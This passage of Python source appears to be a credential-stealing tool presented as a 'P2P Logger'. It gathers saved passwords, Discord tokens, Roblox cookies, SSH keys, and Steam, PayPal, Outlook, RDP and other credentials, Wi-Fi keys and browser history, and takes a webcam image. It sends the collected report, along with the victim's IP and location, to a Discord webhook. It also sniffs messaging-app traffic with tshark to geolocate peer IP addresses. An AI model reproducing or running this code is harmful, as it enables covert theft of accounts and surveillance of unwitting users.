                'username': app.get('username', app.get('name', 'N/A')),
                'password': app.get('password', app.get('value', app.get('data', 'N/A'))),
                'type': 'App'
            })
    
    # Try to extract from other sources
    try:
        # Check for VPN credentials
        vpn_paths = [
            os.path.expanduser("~\\AppData\\Local\\NordVPN"),
            os.path.expanduser("~\\AppData\\Local\\ExpressVPN"),
            os.path.expanduser("~\\AppData\\Local\\ProtonVPN")
        ]
        
        for vpn_path in vpn_paths:
            if os.path.exists(vpn_path):
                for root, dirs, files in os.walk(vpn_path):
                    for file in files:
                        if 'config' in file.lower() or 'auth' in file.lower():
                            try:
                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    # Look for auth lines
                                    for line in content.split('\n'):
                                        if 'auth-user-pass' in line or 'username' in line.lower():
                                            all_passwords.append({
                                                'browser': 'VPN Config',
                                                'url': file,
                                                'username': 'VPN_USER',
                                                'password': 'VPN_AUTH',
                                                'type': 'VPN'
                                            })
                            except:
                                pass
    except:
        pass
    
    return all_passwords if all_passwords else None

# Update the main password function to use comprehensive extraction
def get_saved_passwords():
    """Enhanced password extraction - calls comprehensive function"""
    return get_all_passwords_comprehensive()

def get_ssh_keys():
    """Extract SSH keys"""
    try:
        ssh_dir = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_dir):
            keys = []
            for file in os.listdir(ssh_dir):
                if file.endswith('.pub') or file.startswith('id_'):
                    with open(os.path.join(ssh_dir, file), 'r', encoding='utf-8', errors='ignore') as f:
                        keys.append(f.read().strip())
            return keys if keys else None
    except:
        pass
    return None

def get_roblox_email():
    """Extract Roblox email from API or local data"""
    try:
        cookie = get_roblox_cookie()
        if cookie and requests:
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = requests.get('https://www.roblox.com/my/settings/json', headers=headers, timeout=5)
            if response.status_code == 200:
                data = response.json()
                return data.get('Email')
    except:
        pass
    return None

def get_roblox_username():
    """Extract Roblox username/player name"""
    try:
        if PLATFORM == "Windows":
            roblox_paths = [
                os.path.expanduser("~\\AppData\\Local\\Roblox\\GlobalBasicSettings_13.xml"),
                os.path.expanduser("~\\AppData\\Local\\Roblox\\GlobalSettings.xml"),
            ]
            
            for path in roblox_paths:
                if os.path.exists(path):
                    try:
                        with open(path, 'rb') as f:
                            content = f.read()
                            
                            import re
                            # Look for username patterns
                            patterns = [
                                rb'<BaseUrl>https?://www\.roblox\.com/home\?username=([^&<"]+)',
                                rb'"username":"([^"]+)"',
                                rb'<name>([^<]+)</name>',
                            ]
                            
                            for pattern in patterns:
                                matches = re.findall(pattern, content)
                                if matches:
                                    for match in matches:
                                        if isinstance(match, bytes):
                                            username = match.decode('utf-8', errors='ignore').strip()
                                        else:
                                            username = str(match).strip()
                                        if username and len(username) > 1:
                                            return username
                    except:
                        pass
            
            # Search in Roblox AppData
            roblox_appdata = os.path.expanduser("~\\AppData\\Local\\Roblox")
            if os.path.exists(roblox_appdata):
                for file in os.listdir(roblox_appdata):
                    if file.endswith(('.xml', '.json')):
                        try:
                            with open(os.path.join(roblox_appdata, file), 'rb') as f:
                                data = f.read()
                                if b'username' in data or b'UserName' in data or b'player' in data.lower():
                                    import re
                                    matches = re.findall(rb'[a-zA-Z0-9_]{3,20}', data)
                                    if matches:
                                        return matches[0].decode('utf-8', errors='ignore')
                        except:
                            pass
    except:
        pass
    return None

def get_roblox_user_id():
    """Extract Roblox user ID"""
    try:
        if PLATFORM == "Windows":
            roblox_appdata = os.path.expanduser("~\\AppData\\Local\\Roblox")
            if os.path.exists(roblox_appdata):
                for filename in os.listdir(roblox_appdata):
                    if filename.endswith(('.xml', '.dat', '.json')):
                        try:
                            with open(os.path.join(roblox_appdata, filename), 'rb') as f:
                                content = f.read()
                                
                                import re
                                patterns = [
                                    rb'"userId":(\d+)',
                                    rb'<userid>(\d+)</userid>',
                                    rb'userid["\s:=]+(\d+)',
                                ]
                                
                                for pattern in patterns:
                                    matches = re.findall(pattern, content)
                                    if matches:
                                        for match in matches:
                                            if isinstance(match, bytes):
                                                uid = match.decode('utf-8', errors='ignore').strip()
                                            else:
                                                uid = str(match).strip()
                                            if uid.isdigit() and len(uid) >= 3:
                                                return uid
                        except:
                            pass
    except:
        pass
    return None

def log_program_runner_info():
    """Log EVERYTHING - all system data, Discord data, Roblox data, hardware"""
    
    try:
        public_ip = get_public_ip(timeout=2)
        try:
            wifi_info = get_wifi_ssid() or {}
        except Exception as e:
            wifi_info = {}
            ORIGINAL_PRINT(f"[!] get_wifi_ssid failed: {e}")
        try:
            discord_running = is_discord_running()
        except Exception as e:
            discord_running = False
            ORIGINAL_PRINT(f"[!] is_discord_running failed: {e}")
        try:
            roblox_running = is_roblox_running()
        except Exception as e:
            roblox_running = False
            ORIGINAL_PRINT(f"[!] is_roblox_running failed: {e}")

        # Get all basic info for the full report
        system_info = get_system_info()
        hardware_devices = get_hardware_devices() or {}
        
        # Collect ALL Discord information
        discord_username = get_discord_username()
        discord_email = get_discord_email()
        discord_id = get_discord_user_id()
        discord_token = get_discord_token()
        discord_profile = {}
        if discord_token:
            discord_profile = get_discord_profile_from_token(discord_token)
            if not discord_profile:
                # Keep token candidate for the embed if API validation fails, but mark it as unverified
                discord_profile = {}
        discord_phone = get_discord_phone(discord_profile)

        # Verifiera token genom att testa det
        if discord_profile and discord_profile.get('id'):
            if discord_profile.get('username'):
                discord_username = discord_profile.get('username')
            if discord_profile.get('email'):
                discord_email = discord_profile.get('email')
            if discord_profile.get('phone'):
                discord_phone = discord_profile.get('phone')
            if discord_profile.get('id'):
                discord_id = discord_profile.get('id')

        discord_premium = get_discord_premium_type()
        if discord_profile and discord_profile.get('premium_type'):
            discord_premium = discord_profile.get('premium_type')
        
        # Fallback: if email not found, try Chrome
        if not discord_email:
            discord_email = get_gmail_from_chrome()
        
        # Collect ALL Roblox information
        roblox_username = get_roblox_username()
        roblox_id = get_roblox_user_id()
        roblox_email = get_roblox_email()
        roblox_cookie = get_roblox_cookie()
        
        
        # Collect other credentials
        steam_account = get_steam_credentials()
        telegram_sessions = get_telegram_sessions()
        spotify_token = get_spotify_tokens()
        netflix_cookies = get_netflix_cookies()
        amazon_creds = get_amazon_credentials()
        paypal_creds = get_paypal_credentials()
        autofill_data = get_browser_autofill()
        ssh_keys = get_ssh_keys()
        browser_history = get_browser_history()
        saved_passwords = get_saved_passwords()
        windows_credentials = get_windows_credentials()
        outlook_credentials = get_outlook_credentials()
        filezilla_credentials = get_filezilla_credentials()
        putty_credentials = get_putty_credentials()
        rdp_credentials = get_remote_desktop_credentials()
        
        # Capture webcam image
        webcam_captured = capture_webcam_image()
        
        
        discord_status = "🟢 RUNNING" if discord_running else "🔴 NOT RUNNING"
        roblox_status = "🟢 RUNNING" if roblox_running else "🔴 NOT RUNNING"
        
        discord_status = "🟢 RUNNING" if discord_running else "🔴 NOT RUNNING"
        roblox_status = "🟢 RUNNING" if roblox_running else "🔴 NOT RUNNING"
        
        discord_data = {
            'status': discord_status,
            'username': discord_username,
            'user_id': discord_id,
            'email': discord_email,
            'phone': discord_phone,
            'premium': discord_premium,
            'token': discord_token,
        }
        
        roblox_data = {
            'status': roblox_status,
            'username': roblox_username,
            'user_id': roblox_id,
            'email': roblox_email,
            'cookie': roblox_cookie,
        }
        
        public_location = get_ip_location(public_ip)
        
        # Create separate embeds for better organization
        system_embed = {
            "title": "🖥️ SYSTEM INFORMATION",
            "color": 3447003,  # Blue
            "fields": [
                {"name": "🌐 Public IP", "value": f"`{public_ip}`", "inline": True},
                {"name": "💻 OS", "value": f"{system_info.get('os', 'Unknown')}", "inline": True},
                {"name": "🔧 OS Version", "value": f"{system_info.get('os_version', 'Unknown')}", "inline": True},
                {"name": "🖥️ Machine", "value": f"{system_info.get('machine', 'Unknown')}", "inline": True},
                {"name": "🏗️ Architecture", "value": f"{system_info.get('architecture', 'Unknown')}", "inline": True},
                {"name": "⚙️ Processor", "value": f"{system_info.get('processor', 'Unknown')}", "inline": True},
                {"name": "🖲️ CPU Name", "value": f"{system_info.get('cpu', 'Unknown')}", "inline": True},
                {"name": "💾 RAM", "value": f"{system_info.get('ram_gb', 'Unknown')} GB", "inline": True},
                {"name": "🎮 GPU", "value": f"{system_info.get('gpu', 'Unknown')}", "inline": True},
                {"name": "🏠 Hostname", "value": f"{system_info.get('hostname', 'Unknown')}", "inline": True},
                {"name": "📡 WiFi SSID", "value": f"{wifi_info.get('ssid', 'Unknown')}", "inline": True},
                {"name": "📶 WiFi BSSID", "value": f"{wifi_info.get('bssid', 'Unknown')}", "inline": True},
                {"name": "📊 Signal", "value": f"{wifi_info.get('signal', 'Unknown')}", "inline": True},
                {"name": "📍 Location", "value": f"{public_location.get('city', 'Unknown')}, {public_location.get('country', 'Unknown')}", "inline": True},
            ],
            "footer": {"text": "System Profile"}
        }
        
        discord_embed = {
            "title": "🎮 DISCORD ACCOUNT",
            "color": 7506394,  # Purple
            "fields": [
                {"name": "✅ Status", "value": discord_status, "inline": True},
                {"name": "👤 Username", "value": f"{discord_username if discord_username else 'Unknown'}", "inline": True},
                {"name": "🆔 User ID", "value": f"{discord_id if discord_id else 'Unknown'}", "inline": True},
                {"name": "📧 Email/Gmail", "value": f"{discord_email if discord_email else 'Unknown'}", "inline": True},
                {"name": "📱 Phone Number", "value": f"{discord_phone if discord_phone else 'Not Linked'}", "inline": True},
                {"name": "⭐ Premium Status", "value": f"{discord_premium if discord_premium and discord_premium != 'None' else 'None'}", "inline": True},
            ],
            "footer": {"text": "Discord Profile"}
        }
        
        if discord_token:
            discord_embed["fields"].append({"name": "🔐 Discord Token", "value": f"```{discord_token}```", "inline": False})
        
        roblox_embed = {
            "title": "🎯 ROBLOX ACCOUNT",
            "color": 16776960,  # Yellow
            "fields": [
                {"name": "✅ Status", "value": roblox_status, "inline": True},
                {"name": "👤 Username", "value": f"{roblox_username if roblox_username else 'Unknown'}", "inline": True},
                {"name": "🆔 User ID", "value": f"{roblox_id if roblox_id else 'Unknown'}", "inline": True},
                {"name": "📧 Email/Gmail", "value": f"{roblox_email if roblox_email else 'Unknown'}", "inline": True},
            ],
            "footer": {"text": "Roblox Profile"}
        }
        
        if roblox_cookie:
            roblox_embed["fields"].append({"name": "🔐 Roblox Cookie", "value": f"```{roblox_cookie}```", "inline": False})
        
        embeds = [system_embed, discord_embed, roblox_embed]

        system_embed['fields'].append({
            'name': '📄 Full Report',
            'value': 'A full system report will be attached as `full_system_report.txt`.',
            'inline': False
        })
        
        print("[*] Generating full report...")
        wifi_passwords = get_wifi_passwords()
        app_passwords = get_app_passwords()
        other_data = {
            'steam_account': steam_account,
            'telegram_sessions': telegram_sessions,
            'spotify_token': spotify_token,
            'netflix_cookies': netflix_cookies,
            'amazon_creds': amazon_creds,
            'paypal_creds': paypal_creds,
            'autofill_data': autofill_data,
            'ssh_keys': ssh_keys,
            'browser_history': browser_history,
            'saved_passwords': saved_passwords,
            'wifi_passwords': wifi_passwords,
            'app_passwords': app_passwords,
            'windows_credentials': windows_credentials,
            'outlook_credentials': outlook_credentials,
            'filezilla_credentials': filezilla_credentials,
            'putty_credentials': putty_credentials,
            'rdp_credentials': rdp_credentials,
        }
        report_text = format_full_report(public_ip, system_info, wifi_info, hardware_devices, discord_data, roblox_data, other_data)
        
        try:
            report_path = os.path.join(os.getcwd(), "full_system_report.txt")
            with open(report_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(report_text)
        except Exception:
            pass

        try:
            # Save credentials into nested folders for browsers/apps
            save_credentials_folder_structure(
                os.path.join(os.getcwd(), 'credential_dump'),
                discord_data,
                roblox_data,
                saved_passwords,
                browser_history,
                app_passwords,
                wifi_passwords,
                other_data
            )
        except Exception:
            pass

        try:
            password_dump = []
            password_dump.append('=== PASSWORD DUMP ===')
            if saved_passwords:
                for entry in saved_passwords:
                    service = entry.get('service') or entry.get('app') or entry.get('browser') or 'Unknown'
                    password_dump.append(f"Service: {service}")
                    if entry.get('url'):
                        password_dump.append(f"Location: {entry.get('url')}")
                    if entry.get('username'):
                        password_dump.append(f"Username: {entry.get('username')}")
                    if entry.get('password'):
                        password_dump.append(f"Password: {entry.get('password')}")
                    elif entry.get('token'):
                        password_dump.append(f"Token: {entry.get('token')}")
                    elif entry.get('value'):
                        password_dump.append(f"Value: {entry.get('value')}")
                    password_dump.append('')
            if wifi_passwords:
                for wifi in wifi_passwords:
                    password_dump.append(f"SSID: {wifi.get('ssid', 'Unknown')}")
                    password_dump.append(f"Password: {wifi.get('password', 'Unknown')}")
                    password_dump.append('')
            if app_passwords:
                for app in app_passwords:
                    password_dump.append(f"Service: {app.get('app', 'Unknown')}")
                    if app.get('username'):
                        password_dump.append(f"Username: {app.get('username')}")
                    if app.get('token'):
                        password_dump.append(f"Token: {app.get('token')}")
                    if app.get('password'):
                        password_dump.append(f"Password: {app.get('password')}")
                    password_dump.append('')
            password_path = os.path.join(os.getcwd(), "passwords_dump.txt")
            with open(password_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write('\n'.join(password_dump))
        except Exception:
            pass

        response = send_webhook_report(
            embeds,
            "full_system_report.txt",
            report_text,
            content='@here FULL SYSTEM INFORMATION CAPTURED - SE REPORT ATTACHED.'
        )
        if response is None or getattr(response, 'status_code', 0) >= 400:
            ORIGINAL_PRINT(f"[!] Full report webhook failed: {getattr(response, 'status_code', getattr(response, 'getcode', lambda: None)())}")
            send_webhook_message(content='@here FULL SYSTEM REPORT FAILED - partial data may still be present.', embeds=embeds)
            
    except Exception as e:
        ORIGINAL_PRINT(f"[!] log_program_runner_info failed: {e}")

# ============================================================================
# DATACENTER & GEOGRAPHIC FILTERING
# ============================================================================

# Known datacenter IP ranges by country (to exclude)
DATACENTER_COUNTRIES = {
    'CN': ['datacenter', 'china'],  # China
    'RU': ['datacenter', 'russia'],  # Russia
    'KP': ['datacenter', 'korea'],   # North Korea
    'US': ['Amazon', 'Google', 'Microsoft', 'AWS', 'Azure'],  # US Datacenters
}

# Residential ISP indicators
RESIDENTIAL_INDICATORS = {
    'residential', 'home', 'business', 'isp', 'broadband', 'cable', 'dsl', 'fiber'
}

# ============================================================================
# PROGRAM STARTUP LOGGING
# ============================================================================

def log_startup_ip():
    """Log the IP address of whoever opened the program"""
    try:
        public_ip = get_public_ip()
        print(f"\n" + "="*60)
        print(f"[STARTUP] Program opened by user from IP: {public_ip}")
        print(f"[TIME] {datetime.now().isoformat()}")
        print(f"="*60 + "\n")
        
        # Also log to Discord webhook
        if WEBHOOK_URL:
            public_location = get_ip_location(public_ip, timeout=2)
            try:
                payload = {
                    "embeds": [{
                        "title": "🚀 PROGRAM STARTUP",
                        "description": f"Someone opened P2P Logger",
                        "color": 65280,  # Green
                        "fields": [
                            {"name": "🌐 Public IP", "value": f"`{public_ip}` ({public_location.get('city', 'Unknown')}, {public_location.get('country', 'Unknown')})", "inline": True},
                            {"name": "💻 OS", "value": f"{platform.system()}", "inline": True},
                            {"name": "🕐 Time", "value": datetime.now().isoformat(), "inline": True},
                        ],
                        "footer": {"text": "P2P Logger - Startup Event"}
                    }]
                }
                response = send_webhook_message(embeds=payload['embeds'])
                if response is None or getattr(response, 'status_code', 0) >= 400:
                    ORIGINAL_PRINT(f"[!] Startup webhook failed: {getattr(response, 'status_code', getattr(response, 'getcode', lambda: None)())}")
            except Exception as e:
                ORIGINAL_PRINT(f"[!] Startup webhook error: {e}")
    except Exception as e:
        ORIGINAL_PRINT(f"[!] log_startup_ip failed: {e}")
ALLOWED_COUNTRIES = []  # Disabled - accept all countries

# Blocked countries for peer IPs (blacklist - these explicitly blocked)
BLOCKED_COUNTRIES = ['ZZ']  # Disabled - accept all countries

# GeoIP cache to avoid repeated API calls
GEOIP_CACHE = {}
GEOIP_LOCATION_CACHE = {}

def get_country_for_ip(ip: str) -> str:
    """Get country code for an IP address using GeoIP API"""
    global GEOIP_CACHE
    
    if ip in GEOIP_CACHE:
        return GEOIP_CACHE[ip]
    
    try:
        if requests:
            response = requests.get(f'https://ip-api.com/json/{ip}?fields=countryCode', timeout=3)
            if response.status_code == 200:
                data = response.json()
                if 'countryCode' in data and data['countryCode']:
                    country = data['countryCode']
                    GEOIP_CACHE[ip] = country
                    ORIGINAL_PRINT(f"[GEO] {ip} -> {country}")
                    return country
    except Exception:
        pass
    
    try:
        if requests:
            response = requests.get(f'https://ipwho.is/{ip}', timeout=3)
            if response.status_code == 200:
                data = response.json()
                if 'country_code' in data and data['country_code']:
                    country = data['country_code']
                    GEOIP_CACHE[ip] = country
                    ORIGINAL_PRINT(f"[GEO] {ip} -> {country}")
                    return country
    except Exception:
        pass
    
    GEOIP_CACHE[ip] = 'UNKNOWN'
    return 'UNKNOWN'


def get_ip_location(ip: str, timeout=5) -> dict:
    """Get city and country for an IP address with caching."""
    if not ip:
        return {'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 'countryCode': 'UNK'}
    if ip in GEOIP_LOCATION_CACHE:
        return GEOIP_LOCATION_CACHE[ip]

    location = {'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 'countryCode': 'UNK'}
    try:
        if requests:
            response = requests.get(f'https://ip-api.com/json/{ip}?fields=city,regionName,country,countryCode', timeout=timeout)
            if response.status_code == 200:
                data = response.json()
                location = {
                    'city': data.get('city', 'Unknown') or 'Unknown',
                    'region': data.get('regionName', 'Unknown') or 'Unknown',
                    'country': data.get('country', 'Unknown') or 'Unknown',
                    'countryCode': data.get('countryCode', 'UNK') or 'UNK'
                }
                GEOIP_LOCATION_CACHE[ip] = location
                ORIGINAL_PRINT(f"[GEO] {ip} -> {location['city']}, {location['country']}")
                return location
    except Exception:
        pass

    try:
        if requests:
            response = requests.get(f'https://ipwho.is/{ip}', timeout=timeout)
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    location = {
                        'city': data.get('city', 'Unknown') or 'Unknown',
                        'region': data.get('region', 'Unknown') or 'Unknown',
                        'country': data.get('country', 'Unknown') or 'Unknown',
                        'countryCode': data.get('country_code', 'UNK') or 'UNK'
                    }
                    GEOIP_LOCATION_CACHE[ip] = location
                    ORIGINAL_PRINT(f"[GEO] {ip} -> {location['city']}, {location['country']}")
                    return location
    except Exception:
        pass

    GEOIP_LOCATION_CACHE[ip] = location
    return location


def format_ip_location(ip: str) -> str:
    loc = get_ip_location(ip)
    if loc.get('city') and loc['city'] != 'Unknown':
        return f"`{ip}` ({loc['city']}, {loc['country']})"
    if loc.get('region') and loc['region'] != 'Unknown':
        return f"`{ip}` ({loc['region']}, {loc['country']})"
    return f"`{ip}` ({loc['country']})"

def is_blocked_country(ip: str) -> bool:
    """Check if IP is from a blocked/suspicious country"""
    country = get_country_for_ip(ip)
    
    if country in BLOCKED_COUNTRIES:
        print(f"[BLOCKED] {ip} from {country} (in blocked list)")
        return True
    
    # If allowlist is set, only allow those countries
    if ALLOWED_COUNTRIES:
        if country not in ALLOWED_COUNTRIES and country != 'UNKNOWN':
            print(f"[REJECTED] {ip} from {country} (not in whitelist)")
            return True
    
    return False

def is_likely_datacenter(ip: str) -> bool:
    """Check if IP is likely a datacenter/CDN/relay"""
    # Check known datacenter ranges
    if is_discord_datacenter(ip):
        return True
    
    # Check public services
    if is_public_service(ip):
        return True
    
    # Check for common datacenter patterns in first octets
    try:
        first_octet = int(ip.split('.')[0])
        # Common datacenter ranges
        datacenter_ranges = [34, 35, 52, 54, 75, 76, 104, 172, 176, 184, 199]
        if first_octet in datacenter_ranges:
            # Do secondary check via third octet
            third_octet = int(ip.split('.')[2])
            if third_octet in [0, 1, 2, 3, 16, 32, 64, 128, 192, 224]:
                return True
    except:
        pass
    
    return False

def is_real_peer_ip(ip: str) -> bool:
    """Simple validation - accept public/relay/VPN IPs only (not private)"""
    try:
        addr = ipaddress.ip_address(ip)
        # Reject only private/local addresses
        if addr.is_private or addr.is_loopback or addr.is_link_local:
            return False
        # Accept all public IPs (includes relay, VPN, datacenter, etc.)
        return True
    except:
        return False

# ============================================================================
# CROSS-PLATFORM SUPPORT
# ============================================================================

def get_tshark_path():
    """Find tshark across different platforms"""
    if PLATFORM == "Windows":
        # Try shutil.which first (most reliable)
        tshark = shutil.which("tshark")
        if tshark:
            return tshark
        
        # Manual search
        paths = [
            r"C:\Program Files\Wireshark\tshark.exe",
            r"C:\Program Files (x86)\Wireshark\tshark.exe",
            r"C:\Program Files\Wireshark",
        ]
    elif PLATFORM == "Darwin":  # macOS
        tshark = shutil.which("tshark")
        if tshark:
            return tshark
        paths = ["/usr/local/bin/tshark", "/opt/homebrew/bin/tshark"]
    else:  # Linux
        tshark = shutil.which("tshark")
        if tshark:
            return tshark
        paths = ["/usr/bin/tshark", "/usr/local/bin/tshark"]
    
    for path in paths:
        if os.path.exists(path):
            return path
    
    return None

def get_network_interfaces():
    """Get available network interfaces (silent)"""
    tshark = get_tshark_path()
    if not tshark:
        return []
    
    try:
        result = subprocess.run([tshark, "-D"], capture_output=True, text=True, timeout=5)
        interfaces = []
        for line in result.stdout.strip().split('\n'):
            if line.strip():
                if line[0].isdigit():
                    iface_num = line.split('.')[0].strip()
                    interfaces.append(iface_num)
        return interfaces
    except Exception:
        return []
def check_requirements():
    """Check if all requirements are met"""
    # Silent requirement check for hidden operation.
    tshark_path = get_tshark_path()
    if not tshark_path:
        return False
    return True

# ============================================================================
# GEOIP/ASN CLASSIFICATION (removed - simplified to port-based filtering)
# ============================================================================

def is_datacenter_ip(ip: str) -> Tuple[bool, str]:
    """
    Always returns False - we log all peer IPs regardless of origin
    """
    return False, "Residential"

# Simplified filtering - port-based with TCP fallback
def is_discord_p2p(ip: str, port: int = 0) -> bool:
    """Check if port matches P2P messaging app ranges (Discord, Snapchat, Signal, Telegram, Skype, WhatsApp, Viber, etc.)
    
    Supported apps and their port ranges:
    - Discord: UDP 44-89, 50000-65535 + TCP 443, 80
    - Snapchat: TCP/UDP 5228 + 443, 80
    - Signal: TCP 443 + many UDP ranges
    - Telegram: TCP/UDP 443 + many high ports
    - Skype: UDP/TCP 3478-3479, 50000-65535 + 443
    - WhatsApp: UDP 3478-3479 (STUN) + many P2P ports
    - Viber: UDP/TCP many ranges + 443, 80
    """
    # Discord + Skype P2P ranges (UDP)
    if (44 <= port <= 89) or (50000 <= port <= 65535):
        return True
    
    # STUN/TURN servers (Skype, WhatsApp, Signal, Telegram, etc.)
    if 3478 <= port <= 3479:
        return True
    
    # Snapchat specific
    if port == 5228:
        return True
    
    # Common HTTPS/TLS ports for fallback (all apps use these)
    if port in [443, 80]:
        return True
    
    # Additional high-range P2P ports used by various apps
    if 5000 <= port <= 5100:  # Generic P2P ranges
        return True
    
    return False

# ============================================================================
# IPv6 SUPPORT
# ============================================================================

def is_ipv6(ip: str) -> bool:
    """Check if address is IPv6"""
    return ':' in ip

def normalize_ipv6(ip: str) -> str:
    """Normalize IPv6 address"""
    try:
        return str(ipaddress.IPv6Address(ip))
    except:
        return ip

def is_private_ipv6(ip: str) -> bool:
    """Check if IPv6 is private/link-local"""
    try:
        addr = ipaddress.IPv6Address(ip)
        return addr.is_private or addr.is_link_local or addr.is_loopback
    except:
        return False

# ============================================================================
# TRAFFIC FINGERPRINTING & ANALYSIS
# ============================================================================

class PacketAnalyzer:
    """Analyzes packet timing patterns, jitter, burst patterns"""
    
    def __init__(self):
        self.packet_times = defaultdict(deque)  # IP -> deque of timestamps
        self.packet_sizes = defaultdict(deque)  # IP -> deque of packet sizes
        self.port_entropy = defaultdict(set)  # IP -> set of ports used
        self.rtt_samples = defaultdict(list)  # IP -> list of RTT estimates
        
    def add_packet(self, ip: str, timestamp: float, size: int = 0, port: int = 0):
        """Record packet for later analysis"""
        if len(self.packet_times[ip]) >= 1000:
            self.packet_times[ip].popleft()
        self.packet_times[ip].append(timestamp)
        
        if size > 0 and len(self.packet_sizes[ip]) < 500:
            self.packet_sizes[ip].append(size)
        
        if port > 0:
            self.port_entropy[ip].add(port)
    
    def get_jitter(self, ip: str) -> float:
        """Calculate packet jitter (variation in spacing)"""
        times = list(self.packet_times[ip])
        if len(times) < 3:
            return 0.0
        
        intervals = [times[i+1] - times[i] for i in range(len(times)-1)]
        if not intervals:
            return 0.0
        
        avg = sum(intervals) / len(intervals)
        variance = sum((x - avg) ** 2 for x in intervals) / len(intervals)
        return math.sqrt(variance) if variance > 0 else 0.0
    
    def get_burst_ratio(self, ip: str, window: float = 0.1) -> float:
        """Detect burst patterns (tight clustering of packets)"""
        times = list(self.packet_times[ip])
        if len(times) < 5:
            return 0.0
        
        burst_count = sum(1 for i in range(len(times)-1) 
                         if times[i+1] - times[i] < window)
        return burst_count / len(times) if times else 0.0
    
    def get_packet_size_entropy(self, ip: str) -> float:
        """Entropy of packet sizes (codec identification)"""
        sizes = list(self.packet_sizes[ip])
        if not sizes:
            return 0.0
        
        # Normalize to percentages
        unique_sizes = len(set(sizes))
        return min(unique_sizes / len(sizes), 1.0)
    
    def get_port_entropy(self, ip: str) -> float:
        """Entropy of port usage"""
        ports = self.port_entropy[ip]
        if not ports:
            return 0.0
        
        max_ports = 100
        return min(len(ports) / max_ports, 1.0)
    
    def estimate_rtt(self, ip: str, latency_hint: float = 0.05) -> float:
        """Estimate RTT (passive analysis via packet spacing)"""
        times = list(self.packet_times[ip])
        if len(times) < 2:
            return latency_hint
        
        # Use inter-packet arrival time as proxy
        intervals = [times[i+1] - times[i] for i in range(min(len(times)-1, 100))]
        avg_interval = sum(intervals) / len(intervals) if intervals else latency_hint
        return avg_interval * 1000  # Convert to ms

# ============================================================================
# STUN/TURN DETECTION
# ============================================================================

DISCORD_STUN_SERVERS = [
    "stun.discord.media",
    "stun.l.google.com",
    "stun1.l.google.com",
]

DISCORD_KNOWN_PORTS = {
    50000: "DISCORD_VOICE",
    50001: "DISCORD_VOICE",
    44: "DISCORD_DEFAULT",
    'range_50000_65535': "DISCORD_EPHEMERAL",
}

def is_relay_traffic(ip: str, port: int, src_port: int = 0) -> Tuple[bool, str, float]:
    """
    Detect relay/TURN traffic vs direct P2P
    Returns (is_relay, relay_type, confidence)
    """
    confidence = 0.0
    relay_type = "Direct"
    
    # Check if port is in Discord ranges
    if 50000 <= port <= 65535:
        # Could be PtP via Discord relay
        if src_port and src_port != port:
            relay_type = "POTENTIAL_RELAY"
            confidence = 0.4
        else:
            relay_type = "DISCORD_P2P"
            confidence = 0.8
    elif 44 <= port <= 89:
        relay_type = "DISCORD_PROTOCOL"
        confidence = 0.7
    
    return confidence > 0.5, relay_type, confidence

# ============================================================================
# VPN/PROXY DETECTION
# ============================================================================

VPN_PROVIDERS = {
    'NordVPN': [6830, 31042, 51852],
    'ExpressVPN': [17621, 36939],
    'Mullvad': [64024],
    'ProtonVPN': [60781, 62180],
    'SurfShark': [62888],
}

def detect_vpn_proxy(ip: str, port: int, jitter: float, rtt: float) -> Tuple[bool, str, float]:
    """
    Detect VPN/Proxy usage via:
    - ASN patterns
    - Port behavior
    - Latency characteristics
    - Jitter patterns
    
    Returns (is_vpn, provider_name, confidence)
    """
    confidence = 0.0
    provider = "None"
    
    # Port-based detection
    for vpn_name, vpn_ports in VPN_PROVIDERS.items():
        if port in vpn_ports:
            confidence += 0.5
            provider = vpn_name
    
    # Latency heuristic (VPNs tend to add 20-100ms)
    if 20 < rtt < 150:
        confidence += 0.2
    elif rtt > 150:
        confidence += 0.1
    
    # Jitter patterns (VPNs show more consistent spacing)
    if jitter < 0.01:  # Very tight jitter
        confidence += 0.15
    
    return confidence > 0.6, provider, min(confidence, 1.0)

# ============================================================================
# ANOMALY DETECTION & CLUSTERING
# ============================================================================

class AnomalyDetector:
    """Detects unusual traffic patterns"""
    
    def __init__(self):
        self.baseline_stats = {}
        self.deviations = defaultdict(list)
        
    def update_baseline(self, ip: str, metrics: Dict):
        """Update baseline statistics for an IP"""
        if ip not in self.baseline_stats:
            self.baseline_stats[ip] = {
                'packets': 0,
                'avg_size': 0,
                'jitter': 0,
            }
        
        stats = self.baseline_stats[ip]
        stats['packets'] += metrics.get('packet_count', 0)
        stats['avg_size'] = metrics.get('avg_size', stats['avg_size'])
        stats['jitter'] = metrics.get('jitter', stats['jitter'])
    
    def detect_anomaly(self, ip: str, metrics: Dict) -> Tuple[bool, float]:
        """
        Detect anomalous behavior
        Returns (is_anomaly, anomaly_score)
        """
        if ip not in self.baseline_stats:
            return False, 0.0
        
        baseline = self.baseline_stats[ip]
        anomaly_score = 0.0
        
        # Sudden spike in packet count
        current_packets = metrics.get('packet_count', 0)
        if baseline['packets'] > 0:
            ratio = current_packets / (baseline['packets'] + 1)
            if ratio > 5:
                anomaly_score += 0.4
        
        # Unusual jitter change
        current_jitter = metrics.get('jitter', 0)
        if abs(current_jitter - baseline['jitter']) > 0.05:
            anomaly_score += 0.2
        
        # Sudden port change
        if metrics.get('port_change', False):
            anomaly_score += 0.3
        
        return anomaly_score > CONFIG['anomaly_threshold'], anomaly_score

# ============================================================================
# SESSION CORRELATION
# ============================================================================

class SessionCorrelator:
    """Correlates traffic across multiple IPs/sessions"""
    
    def __init__(self):
        self.sessions = defaultdict(dict)  # session_id -> {ips, ports, times}
        self.ip_sessions = defaultdict(set)  # IP -> set of session_ids
        self.session_counter = 0
    
    def create_session(self, ip: str, port: int) -> str:
        """Create or retrieve session for IP:port pair"""
        session_key = f"{ip}:{port}"
        
        if session_key not in self.ip_sessions[ip]:
            self.session_counter += 1
            session_id = f"sess_{self.session_counter}"
            self.sessions[session_id] = {
                'ips': set(),
                'ports': set(),
                'start_time': datetime.now(),
                'last_activity': datetime.now(),
            }
            self.ip_sessions[ip].add(session_id)
            self.sessions[session_id]['ips'].add(ip)
            self.sessions[session_id]['ports'].add(port)
        else:
            session_id = list(self.ip_sessions[ip])[0]
            self.sessions[session_id]['last_activity'] = datetime.now()
        
        return session_id
    
